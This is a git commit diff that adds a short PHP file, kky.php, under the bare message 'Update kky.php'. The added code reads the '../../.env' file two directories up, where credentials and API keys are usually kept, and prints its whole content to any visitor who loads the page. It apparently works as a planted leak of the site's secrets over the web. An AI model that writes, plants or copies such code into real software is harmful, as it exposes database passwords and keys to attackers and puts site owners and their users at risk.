ff22274960fe66f3cf9434675a47bf89f255dc26
qikerrs <129662698+qikerrs@users.noreply.github.com>
2026-05-29 04:52:43 +0700

    Update kky.php

--- kky.php
+++ kky.php
@@ -1,1 +1,18 @@
 
+<?php
+$filename = "../../.env";
+
+// Open the file in read-only mode ('r')
+$file = fopen($filename, "r");
+
+if ($file) {
+    // Read the entire file content
+    $content = fread($file, filesize($filename));
+    echo $content;
+
+    // Always close the file pointer
+    fclose($file);
+} else {
+    echo "Failed to open the file.";
+}
+?>
